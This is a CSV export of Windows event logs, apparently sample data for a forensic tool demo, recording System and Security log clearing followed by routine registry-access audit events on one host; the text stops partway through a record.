RecordNumber,EventRecordId,TimeCreated,EventId,Level,Provider,Channel,ProcessId,ThreadId,Computer,ChunkNumber,UserId,MapDescription,UserName,RemoteHost,PayloadData1,PayloadData2,PayloadData3,PayloadData4,PayloadData5,PayloadData6,ExecutableInfo,HiddenRecord,SourceFile,Keywords,ExtraDataOffset,Payload
1,27736,2019-03-19 23:34:25.8943413,104,Info,Microsoft-Windows-Eventlog,System,812,3916,PC01.example.corp,0,S-1-5-21-1587066498-1489273250-1035260531-1106,Event log cleared,EXAMPLE\user01,,The System log file was cleared,,,,,,,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/DE_104_system_log_cleared.evtx,Classic,0,"{""UserData"":{""LogFileCleared"":{""SubjectUserName"":""user01"",""SubjectDomainName"":""EXAMPLE"",""Channel"":""System"",""BackupPath"":""""}}}"
1,452811,2019-03-19 23:35:07.5242021,1102,Info,Microsoft-Windows-Eventlog,Security,812,3916,PC01.example.corp,0,,Event log cleared,EXAMPLE\user01,,SID: (S-1-5-21-1587066498-1489273250-1035260531-1106),,,,,,,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/DE_1102_security_log_cleared.evtx,0x4020000000000000,0,"{""UserData"":{""LogFileCleared"":{""SubjectUserSid"":""S-1-5-21-1587066498-1489273250-1035260531-1106"",""SubjectUserName"":""user01"",""SubjectDomainName"":""EXAMPLE"",""SubjectLogonId"":""0x17DAD""}}}"
2,452812,2019-03-19 23:35:08.7860165,5156,LogAlways,Microsoft-Windows-Security-Auditing,Security,4,60,PC01.example.corp,0,,The Windows Filtering Platform has allowed a connection,,,Source: fe80::80ac:4126:fa58:1b81:546,Dest: ff02::1:2:547,Protocol: User Datagram Protocol (UDP),PID: 812,Direction: Outbound,LayerName: Connect,\device\harddiskvolume1\windows\system32\svchost.exe,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/DE_1102_security_log_cleared.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""ProcessID"",""#text"":""812""},{""@Name"":""Application"",""#text"":""\\device\\harddiskvolume1\\windows\\system32\\svchost.exe""},{""@Name"":""Direction"",""#text"":""%%14593""},{""@Name"":""SourceAddress"",""#text"":""fe80::80ac:4126:fa58:1b81""},{""@Name"":""SourcePort"",""#text"":""546""},{""@Name"":""DestAddress"",""#text"":""ff02::1:2""},{""@Name"":""DestPort"",""#text"":""547""},{""@Name"":""Protocol"",""#text"":""17""},{""@Name"":""FilterRTID"",""#text"":""65853""},{""@Name"":""LayerName"",""#text"":""%%14611""},{""@Name"":""LayerRTID"",""#text"":""50""},{""@Name"":""RemoteUserID"",""#text"":""S-1-0-0""},{""@Name"":""RemoteMachineID"",""#text"":""S-1-0-0""}]}}"
3,452813,2019-03-19 23:35:14.6344261,4663,LogAlways,Microsoft-Windows-Security-Auditing,Security,4,60,PC01.example.corp,0,,Attempt was made to access an object,NT AUTHORITY\LOCAL SERVICE,,ObjectServer: Security,ObjectType: Key,ObjectName: \REGISTRY\MACHINE\SYSTEM\ControlSet001\Control\Lsa\FipsAlgorithmPolicy,"AccessList: Unknown code (%%4432, )",,,C:\Windows\System32\svchost.exe,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/DE_1102_security_log_cleared.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-19""},{""@Name"":""SubjectUserName"",""#text"":""LOCAL SERVICE""},{""@Name"":""SubjectDomainName"",""#text"":""NT AUTHORITY""},{""@Name"":""SubjectLogonId"",""#text"":""0x3E5""},{""@Name"":""ObjectServer"",""#text"":""Security""},{""@Name"":""ObjectType"",""#text"":""Key""},{""@Name"":""ObjectName"",""#text"":""\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\Control\\Lsa\\FipsAlgorithmPolicy""},{""@Name"":""HandleId"",""#text"":""0x468""},{""@Name"":""AccessList"",""#text"":""%%4432, ""},{""@Name"":""AccessMask"",""#text"":""0x1""},{""@Name"":""ProcessId"",""#text"":""0x5A8""},{""@Name"":""ProcessName"",""#text"":""C:\\Windows\\System32\\svchost.exe""}]}}"
4,452814,2019-03-19 23:35:14.6344261,4663,LogAlways,Microsoft-Windows-Security-Auditing,Security,4,60,PC01.example.corp,0,,Attempt was made to access an object,NT AUTHORITY\LOCAL SERVICE,,ObjectServer: Security,ObjectType: Key,ObjectName: \REGISTRY\MACHINE\SYSTEM\ControlSet001\Control\Lsa,"AccessList: Unknown code (%%4432, )",,,C:\Windows\System32\svchost.exe,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/DE_1102_security_log_cleared.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-19""},{""@Name"":""SubjectUserName"",""#text"":""LOCAL SERVICE""},{""@Name"":""SubjectDomainName"",""#text"":""NT AUTHORITY""},{""@Name"":""SubjectLogonId"",""#text"":""0x3E5""},{""@Name"":""ObjectServer"",""#text"":""Security""},{""@Name"":""ObjectType"",""#text"":""Key""},{""@Name"":""ObjectName"",""#text"":""\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\Control\\Lsa""},{""@Name"":""HandleId"",""#text"":""0x520""},{""@Name"":""AccessList"",""#text"":""%%4432, ""},{""@Name"":""AccessMask"",""#text"":""0x1""},{""@Name"":""ProcessId"",""#text"":""0x5A8""},{""@Name"":""ProcessName"",""#text"":""C:\\Windows\\System32\\svchost.exe""}]}}"
5,452815,2019-03-19 23:35:14.7646133,4663,LogAlways,Microsoft-Windows-Security-Auditing,Security,4,60,PC01.example.corp,0,,Attempt was made to access an object,NT AUTHORITY\LOCAL SERVICE,,ObjectServer: Security,ObjectType: Key,ObjectName: \REGISTRY\MACHINE\SYSTEM\ControlSet001\Control\Lsa\FipsAlgorithmPolicy,"AccessList: Unknown code (%%4432, )",,,C:\Windows\System32\svchost.exe,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/DE_1102_security_log_cleared.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-19""},{""@Name"":""SubjectUserName"",""#text"":""LOCAL SERVICE""},{""@Name"":""SubjectDomainName"",""#text"":""NT AUTHORITY""},{""@Name"":""SubjectLogonId"",""#text"":""0x3E5""},{""@Name"":""ObjectServer"",""#text"":""Security""},{""@Name"":""ObjectType"",""#text"":""Key""},{""@Name"":""ObjectName"",""#text"":""\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\Control\\Lsa\\FipsAlgorithmPolicy""},{""@Name"":""HandleId"",""#text"":""0x520""},{""@Name"":""AccessList"",""#text"":""%%4432, ""},{""@Name"":""AccessMask"",""#text"":""0x1""},{""@Name"":""ProcessId"",""#text"":""0x5A8""},{""@Name"":""ProcessName"",""#text"":""C:\\Windows\\System32\\svchost.exe""}]}}"
6,452816,2019-03-19 23:35:14.7646133,4663,LogAlways,Microsoft-Windows-Security-Auditing,Security,4,60,PC01.example.corp,0,,Attempt was made to access an object,NT AUTHORITY\LOCAL SERVICE,,ObjectServer: Security,ObjectType: Key,ObjectName: \REGISTRY\MACHINE\SYSTEM\ControlSet001\Control\Lsa,"AccessList: Unknown code (%%4432, )",,,C:\Windows\System32\svchost.exe,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/DE_1102_security_log_cleared.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-19""},{""@Name"":""SubjectUserName"",""#text"":""LOCAL SERVICE""},{""@Name"":""SubjectDomainName"",""#text"":""NT AUTHORITY""},{""@Name"":""SubjectLogonId"",""#text"":""0x3E5""},{""@Name"":""ObjectServer"",""#text"":""Security""},{""@Name"":""ObjectType"",""#text"":""Key""},{""@Name"":""ObjectName"",""#text"":""\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\Control\\Lsa""},{""@Name"":""HandleId"",""#text"":""0x468""},{""@Name"":""AccessList"",""#text"":""%%4432, ""},{""@Name"":""AccessMask"",""#text"":""0x1""},{""@Name"":""ProcessId"",""#text"":""0x5A8""},{""@Name"":""ProcessName"",""#text"":""C:\\Windows\\System32\\svchost.exe""}]}}"
7,452817,2019-03-19 23:35:14.9048149,4663,LogAlways,Microsoft-Windows-Security-Auditing,Security,4,60,PC01.example.corp,0,,Attempt was made to access an object,NT AUTHORITY\LOCAL SERVICE,,ObjectServer: Security,ObjectType: Key,ObjectName: \REGISTRY\MACHINE\SYSTEM\ControlSet001\Control\Lsa\FipsAlgorithmPolicy,"AccessList: Unknown code (%%4432, )",,,C:\Windows\System32\svchost.exe,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/DE_1102_security_log_cleared.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-19""},{""@Name"":""SubjectUserName"",""#text"":""LOCAL SERVICE""},{""@Name"":""SubjectDomainName"",""#text"":""NT AUTHORITY""},{""@Name"":""SubjectLogonId"",""#text"":""0x3E5""},{""@Name"":""ObjectServer"",""#text"":""Security""},{""@Name"":""ObjectType"",""#text"":""Key""},{""@Name"":""ObjectName"",""#text"":""\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\Control\\Lsa\\FipsAlgorithmPolicy""},{""@Name"":""HandleId"",""#text"":""0x468""},{""@Name"":""AccessList"",""#text"":""%%4432, ""},{""@Name"":""AccessMask"",""#text"":""0x1""},{""@Name"":""ProcessId"",""#text"":""0x5A8""},{""@Name"":""ProcessName"",""#text"":""C:\\Windows\\System32\\svchost.exe""}]}}"
8,452818,2019-03-19 23:35:14.9048149,4663,LogAlways,Microsoft-Windows-Security-Auditing,Security,4,60,PC01.example.corp,0,,Attempt was made to access an object,NT AUTHORITY\LOCAL SERVICE,,ObjectServer: Security,ObjectType: Key,ObjectName: \REGISTRY\MACHINE\SYSTEM\ControlSet001\Control\Lsa,"AccessList: Unknown code (%%4432, )",,,C:\Windows\System32\svchost.exe,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/DE_1102_security_log_cleared.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-19""},{""@Name"":""SubjectUserName"",""#text"":""LOCAL SERVICE""},{""@Name"":""SubjectDomainName"",""#text"":""NT AUTHORITY""},{""@Name"":""SubjectLogonId"",""#text"":""0x3E5""},{""@Name"":""ObjectServer"",""#text"":""Security""},{""@Name"":""ObjectType"",""#text"":""Key""},{""@Name"":""ObjectName"",""#text"":""\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\Control\\Lsa""},{""@Name"":""HandleId"",""#text"":""0x520""},{""@Name"":""AccessList"",""#text"":""%%4432, ""},{""@Name"":""AccessMask"",""#text"":""0x1""},{""@Name"":""ProcessId"",""#text"":""0x5A8""},{""@Name"":""ProcessName"",""#text"":""C:\\Windows\\System32\\svchost.exe""}]}}"
9,452819,2019-03-19 23:35:15.0450165,4663,LogAlways,Microsoft-Windows-Security-Auditing,Security,4,60,PC01.example.corp,0,,Attempt was made to access an object,NT AUTHORITY\LOCAL SERVICE,,ObjectServer: Security,ObjectType: Key,ObjectName: \REGISTRY\MACHINE\SYSTEM\ControlSet001\Control\Lsa\FipsAlgorithmPolicy,"AccessList: Unknown code (%%4432, )",,,C:\Windows\System32\svchost.exe,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/DE_1102_security_log_cleared.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-19""},{""@Name"":""SubjectUserName"",""#text"":""LOCAL SERVICE""},{""@Name"":""SubjectDomainName"",""#text"":""NT AUTHORITY""},{""@Name"":""SubjectLogonId"",""#text"":""0x3E5""},{""@Name"":""ObjectServer"",""#text"":""Security""},{""@Name"":""ObjectType"",""#text"":""Key""},{""@Name"":""ObjectName"",""#text"":""\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\Control\\Lsa\\FipsAlgorithmPolicy""},{""@Name"":""HandleId"",""#text"":""0x520""},{""@Name"":""AccessList"",""#text"":""%%4432, ""},{""@Name"":""AccessMask"",""#text"":""0x1""},{""@Name"":""ProcessId"",""#text"":""0x5A8""},{""@Name"":""ProcessName"",""#text"":""C:\\Windows\\System32\\svchost.exe""}]}}"
10,452820,2019-03-19 23:35:15.0450165,4663,LogAlways,Microsoft-Windows-Security-Auditing,Security,4,60,PC01.example.corp,0,,Attempt was made to access an object,NT AUTHORITY\LOCAL SERVICE,,ObjectServer: Security,ObjectType: Key,ObjectName: \REGISTRY\MACHINE\SYSTEM\ControlSet001\Control\Lsa,"AccessList: Unknown code (%%4432, )",,,C:\Windows\System32\svchost.exe,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/DE_1102_security_log_cleared.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-19""},{""@Name"":""SubjectUserName"",""#text"":""LOCAL SERVICE""},{""@Name"":""SubjectDomainName"",""#text"":""NT AUTHORITY""},{""@Name"":""SubjectLogonId"",""#text"":""0x3E5""},{""@Name"":""ObjectServer"",""#text"":""Security""},{""@Name"":""ObjectType"",""#text"":""Key""},{""@Name"":""ObjectName"",""#text"":""\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\Control\\Lsa""},{""@Name"":""HandleId"",""#text"":""0x468""},{""@Name"":""AccessList"",""#text"":""%%4432, ""},{""@Name"":""AccessMask"",""#text"":""0x1""},{""@Name"":""ProcessId"",""#text"":""0x5A8""},{""@Name"":""ProcessName"",""#text"":""C:\\Windows\\System32\\svchost.exe""}]}}"
11,452821,2019-03-19 23:35:15.1852181,4663,LogAlways,Microsoft-Windows-Security-Auditing,Security,4,60,PC01.example.corp,0,,Attempt was made to access an object,NT AUTHORITY\LOCAL SERVICE,,ObjectServer: Security,ObjectType: Key,ObjectName: \REGISTRY\MACHINE\SYSTEM\ControlSet001\Control\Lsa\FipsAlgorithmPolicy,"AccessList: Unknown code (%%4432, )",,,C:\Windows\System32\svchost.exe,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/DE_1102_security_log_cleared.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-19""},{""@Name"":""SubjectUserName"",""#text"":""LOCAL SERVICE""},{""@Name"":""SubjectDomainName"",""#text"":""NT AUTHORITY""},{""@Name"":""SubjectLogonId"",""#text"":""0x3E5""},{""@Name"":""ObjectServer"",""#text"":""Security""},{""@Name"":""ObjectType"",""#text"":""Key""},{""@Name"":""ObjectName"",""#text"":""\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\Control\\Lsa\\FipsAlgorithmPolicy""},{""@Name"":""HandleId"",""#text"":""0x468""},{""@Name"":""AccessList"",""#text"":""%%4432, ""},{""@Name"":""AccessMask"",""#text"":""0x1""},{""@Name"":""ProcessId"",""#text"":""0x5A8""},{""@Name"":""ProcessName"",""#text"":""C:\\Windows\\System32\\svchost.exe""}]}}"
12,452822,2019-03-19 23:35:15.1852181,4663,LogAlways,Microsoft-Windows-Security-Auditing,Security,4,60,PC01.example.corp,0,,Attempt was made to access an object,NT AUTHORITY\LOCAL SERVICE,,ObjectServer: Security,ObjectType: Key,ObjectName: \REGISTRY\MACHINE\SYSTEM\ControlSet001\Control\Lsa,"AccessList: Unknown code (%%4432, )",,,C:\Windows\System32\svchost.exe,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/DE_1102_security_log_cleared.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-19""},{""@Name"":""SubjectUserName"",""#text"":""LOCAL SERVICE""},{""@Name"":""SubjectDomainName"",""#text"":""NT AUTHORITY""},{""@Name"":""SubjectLogonId"",""#text"":""0x3E5""},{""@Name"":""ObjectServer"",""#text"":""Security""},{""@Name"":""ObjectType"",""#text"":""Key""},{""@Name"":""ObjectName"",""#text"":""\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\Control\\Lsa""},{""@Name"":""HandleId"",""#text"":""0x520""},{""@Name"":""AccessList"",""#text"":""%%4432, ""},{""@Name"":""AccessMask"",""#text"":""0x1""},{""@Name"":""ProcessId"",""#text"":""0x5A8""},{""@Name"":""ProcessName"",""#text"":""C:\\Windows\\System32\\svchost.exe""}]}}"
13,452823,2019-03-19 23:35:15.2052469,4663,LogAlways,Microsoft-Windows-Security-Auditing,Security,4,60,PC01.example.corp,0,,Attempt was made to access an object,NT AUTHORITY\LOCAL SERVICE,,ObjectServer: Security,ObjectType: Key,ObjectName: \REGISTRY\MACHINE\SYSTEM\ControlSet001\Control\Lsa\FipsAlgorithmPolicy,"AccessList: Unknown code (%%4432, )",,,C:\Windows\System32\svchost.exe,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/DE_1102_security_log_cleared.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-19""},{""@Name"":""SubjectUserName"",""#text"":""LOCAL SERVICE""},{""@Name"":""SubjectDomainName"",""#text"":""NT AUTHORITY""},{""@Name"":""SubjectLogonId"",""#text"":""0x3E5""},{""@Name"":""ObjectServer"",""#text"":""Security""},{""@Name"":""ObjectType"",""#text"":""Key""},{""@Name"":""ObjectName"",""#text"":""\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\Control\\Lsa\\FipsAlgorithmPolicy""},{""@Name"":""HandleId"",""#text"":""0x520""},{""@Name"":""AccessList"",""#text"":""%%4432, ""},{""@Name"":""AccessMask"",""#text"":""0x1""},{""@Name"":""ProcessId"",""#text"":""0x5A8""},{""@Name"":""ProcessName"",""#text"":""C:\\Windows\\System32\\svchost.exe""}]}}"
14,452824,2019-03-19 23:35:15.2152613,4663,LogAlways,Microsoft-Windows-Security-Auditing,Security,4,60,PC01.example.corp,0,,Attempt was made to access an object,NT AUTHORITY\LOCAL SERVICE,,ObjectServer: Security,ObjectType: Key,ObjectName: \REGISTRY\MACHINE\SYSTEM\ControlSet001\Control\Lsa,"AccessList: Unknown code (%%4432, )",,,C:\Windows\System32\svchost.exe,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/DE_1102_security_log_cleared.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-19""},{""@Name"":""SubjectUserName"",""#text"":""LOCAL SERVICE""},{""@Name"":""SubjectDomainName"",""#text"":""NT AUTHORITY""},{""@Name"":""SubjectLogonId"",""#text"":""0x3E5""},{""@Name"":""ObjectServer"",""#text"":""Security""},{""@Name"":""ObjectType"",""#text"":""Key""},{""@Name"":""ObjectName"",""#text"":""\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\Control\\Lsa""},{""@Name"":""HandleId"",""#text"":""0x468""},{""@Name"":""AccessList"",""#text"":""%%4432, ""},{""@Name"":""AccessMask"",""#text"":""0x1""},{""@Name"":""ProcessId"",""#text"":""0x5A8""},{""@Name"":""ProcessName"",""#text"":""C:\\Windows\\System32\\svchost.exe""}]}}"
15,452825,2019-03-19 23:35:15.2152613,4663,LogAlways,Microsoft-Windows-Security-Auditing,Security,4,60,PC01.example.corp,0,,Attempt was made to access an object,NT AUTHORITY\LOCAL SERVICE,,ObjectServer: Security,ObjectType: Key,ObjectName: \REGISTRY\MACHINE\SYSTEM\ControlSet001\Control\Lsa\FipsAlgorithmPolicy,"AccessList: Unknown code (%%4432, )",,,C:\Windows\System32\svchost.exe,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/DE_1102_security_log_cleared.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-19""},{""@Name"":""SubjectUserName"",""#text"":""LOCAL SERVICE""},{""@Name"":""SubjectDomainName"",""#text"":""NT AUTHORITY""},{""@Name"":""SubjectLogonId"",""#text"":""0x3E5""},{""@Name"":""ObjectServer"",""#text"":""Security""},{""@Name"":""ObjectType"",""#text"":""Key""},{""@Name"":""ObjectName"",""#text"":""\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\Control\\Lsa\\FipsAlgorithmPolicy""},{""@Name"":""HandleId"",""#text"":""0x468""},{""@Name"":""AccessList"",""#text"":""%%4432, ""},{""@Name"":""AccessMask"",""#text"":""0x1""},{""@Name"":""ProcessId"",""#text"":""0x5A8""},{""@Name"":""ProcessName"",""#text"":""C:\\Windows\\System32\\svchost.exe""}]}}"
16,452826,2019-03-19 23:35:15.2152613,4663,LogAlways,Microsoft-Windows-Security-Auditing,Security,4,60,PC01.example.corp,0,,Attempt was made to access an object,NT AUTHORITY\LOCAL SERVICE,,ObjectServer: Security,ObjectType: Key,ObjectName: \REGISTRY\MACHINE\SYSTEM\ControlSet001\Control\Lsa,"AccessList: Unknown code (%%4432, )",,,C:\Windows\System32\svchost.exe,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/DE_1102_security_log_cleared.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-19""},{""@Name"":""SubjectUserName"",""#text"":""LOCAL SERVICE""},{""@Name"":""SubjectDomainName"",""#text"":""NT AUTHORITY""},{""@Name"":""SubjectLogonId"",""#text"":""0x3E5""},{""@Name"":""ObjectServer"",""#text"":""Security""},{""@Name"":""ObjectType"",""#text"":""Key""},{""@Name"":""ObjectName"",""#text"":""\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\Control\\Lsa""},{""@Name"":""HandleId"",""#text"":""0x520""},{""@Name"":""AccessList"",""#text"":""%%4432, ""},{""@Name"":""AccessMask"",""#text"":""0x1""},{""@Name"":""ProcessId"",""#text"":""0x5A8""},{""@Name"":""ProcessName"",""#text"":""C:\\Windows\\System32\\svchost.exe""}]}}"
17,452827,2019-03-19 23:35:15.2953765,4663,LogAlways,Microsoft-Windows-Security-Auditing,Security,4,60,PC01.example.corp,0,,Attempt was made to access an object,NT AUTHORITY\LOCAL SERVICE,,ObjectServer: Security,ObjectType: Key,ObjectName: \REGISTRY\MACHINE\SYSTEM\ControlSet001\Control\Lsa\FipsAlgorithmPolicy,"AccessList: Unknown code (%%4432, )",,,C:\Windows\System32\svchost.exe,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/DE_1102_security_log_cleared.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-19""},{""@Name"":""SubjectUserName"",""#text"":""LOCAL SERVICE""},{""@Name"":""SubjectDomainName"",""#text"":""NT AUTHORITY""},{""@Name"":""SubjectLogonId"",""#text"":""0x3E5""},{""@Name"":""ObjectServer"",""#text"":""Security""},{""@Name"":""ObjectType"",""#text"":""Key""},{""@Name"":""ObjectName"",""#text"":""\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\Control\\Lsa\\FipsAlgorithmPolicy""},{""@Name"":""HandleId"",""#text"":""0x520""},{""@Name"":""AccessList"",""#text"":""%%4432, ""},{""@Name"":""AccessMask"",""#text"":""0x1""},{""@Name"":""ProcessId"",""#text"":""0x5A8""},{""@Name"":""ProcessName"",""#text"":""C:\\Windows\\System32\\svchost.exe""}]}}"
18,452828,2019-03-19 23:35:15.2953765,4663,LogAlways,Microsoft-Windows-Security-Auditing,Security,4,60,PC01.example.corp,0,,Attempt was made to access an object,NT AUTHORITY\LOCAL SERVICE,,ObjectServer: Security,ObjectType: Key,ObjectName: \REGISTRY\MACHINE\SYSTEM\ControlSet001\Control\Lsa,"AccessList: Unknown code (%%4432, )",,,C:\Windows\System32\svchost.exe,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/DE_1102_security_log_cleared.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-19""},{""@Name"":""SubjectUserName"",""#text"":""LOCAL SERVICE""},{""@Name"":""SubjectDomainName"",""#text"":""NT AUTHORITY""},{""@Name"":""SubjectLogonId"",""#text"":""0x3E5""},{""@Name"":""ObjectServer"",""#text"":""Security""},{""@Name"":""ObjectType"",""#text"":""Key""},{""@Name"":""ObjectName"",""#text"":""\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\Control\\Lsa""},{""@Name"":""HandleId"",""#text"":""0x468""},{""@Name"":""AccessList"",""#text"":""%%4432, ""},{""@Name"":""AccessMask"",""#text"":""0x1""},{""@Name"":""ProcessId"",""#text"":""0x5A8""},{""@Name"":""ProcessName"",""#text"":""C:\\Windows\\System32\\svchost.exe""}]}}"
19,452829,2019-03-19 23:35:15.2953765,4663,LogAlways,Microsoft-Windows-Security-Auditing,Security,4,60,PC01.example.corp,0,,Attempt was made to access an object,NT AUTHORITY\LOCAL SERVICE,,ObjectServer: Security,ObjectType: Key,ObjectName: \REGISTRY\MACHINE\SYSTEM\ControlSet001\Control\Lsa\FipsAlgorithmPolicy,"AccessList: Unknown code (%%4432, )",,,C:\Windows\System32\svchost.exe,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/DE_1102_security_log_cleared.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-19""},{""@Name"":""SubjectUserName"",""#text"":""LOCAL SERVICE""},{""@Name"":""SubjectDomainName"",""#text"":""NT AUTHORITY""},{""@Name"":""SubjectLogonId"",""#text"":""0x3E5""},{""@Name"":""ObjectServer"",""#text"":""Security""},{""@Name"":""ObjectType"",""#text"":""Key""},{""@Name"":""ObjectName"",""#text"":""\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\Control\\Lsa\\FipsAlgorithmPolicy""},{""@Name"":""HandleId"",""#text"":""0x468""},{""@Name"":""AccessList"",""#text"":""%%4432, ""},{""@Name"":""AccessMask"",""#text"":""0x1""},{""@Name"":""ProcessId"",""#text"":""0x5A8""},{""@Name"":""ProcessName"",""#text"":""C:\\Windows\\System32\\svchost.exe""}]}}"
20,452830,2019-03-19 23:35:15.2953765,4663,LogAlways,Microsoft-Windows-Security-Auditing,Security,4,60,PC01.example.corp,0,,Attempt was made to access an object,NT AUTHORITY\LOCAL SERVICE,,ObjectServer: Security,ObjectType: Key,ObjectName: \REGISTRY\MACHINE\SYSTEM\ControlSet001\Control\Lsa,"AccessList: Unknown code (%%4432, )",,,C:\Windows\System32\svchost.exe,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/DE_1102_security_log_cleared.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-19""},{""@Name"":""SubjectUserName"",""#text"":""LOCAL SERVICE""},{""@Name"":""SubjectDomainName"",""#text"":""NT AUTHORITY""},{""@Name"":""SubjectLogonId"",""#text"":""0x3E5""},{""@Name"":""ObjectServer"",""#text"":""Security""},{""@Name"":""ObjectType"",""#text"":""Key""},{""@Name"":""ObjectName"",""#text"":""\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\Control\\Lsa""},{""@Name"":""HandleId"",""#text"":""0x520""},{""@Name"":""AccessList"",""#text"":""%%4432, ""},{""@Name"":""AccessMask"",""#text"":""0x1""},{""@Name"":""ProcessId"",""#text"":""0x5A8""},{""@Name"":""ProcessName"",""#text"":""C:\\Windows\\System32\\svchost.exe""}]}}"
21,452831,2019-03-19 23:35:15.2953765,4663,LogAlways,Microsoft-Windows-Security-Auditing,Security,4,60,PC01.example.corp,0,,Attempt was made to access an object,NT AUTHORITY\LOCAL SERVICE,,ObjectServer: Security,ObjectType: Key,ObjectName: \REGISTRY\MACHINE\SYSTEM\ControlSet001\Control\Lsa\FipsAlgorithmPolicy,"AccessList: Unknown code (%%4432, )",,,C:\Windows\System32\svchost.exe,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/DE_1102_security_log_cleared.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-19""},{""@Name"":""SubjectUserName"",""#text"":""LOCAL SERVICE""},{""@Name"":""SubjectDomainName"",""#text"":""NT AUTHORITY""},{""@Name"":""SubjectLogonId"",""#text"":""0x3E5""},{""@Name"":""ObjectServer"",""#text"":""Security""},{""@Name"":""ObjectType"",""#text"":""Key""},{""@Name"":""ObjectName"",""#text"":""\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\Control\\Lsa\\FipsAlgorithmPolicy""},{""@Name"":""HandleId"",""#text"":""0x520""},{""@Name"":""AccessList"",""#text"":""%%4432, ""},{""@Name"":""AccessMask"",""#text"":""0x1""},{""@Name"":""ProcessId"",""#text"":""0x5A8""},{""@Name"":""ProcessName"",""#text"":""C:\\Windows\\System32\\svchost.exe""}]}}"
22,452832,2019-03-19 23:35:15.2953765,4663,LogAlways,Microsoft-Windows-Security-Auditing,Security,4,60,PC01.example.corp,0,,Attempt was made to access an object,NT AUTHORITY\LOCAL SERVICE,,ObjectServer: Security,ObjectType: Key,ObjectName: \REGISTRY\MACHINE\SYSTEM\ControlSet001\Control\Lsa,"AccessList: Unknown code (%%4432, )",,,C:\Windows\System32\svchost.exe,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/DE_1102_security_log_cleared.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-19""},{""@Name"":""SubjectUserName"",""#text"":""LOCAL SERVICE""},{""@Name"":""SubjectDomainName"",""#text"":""NT 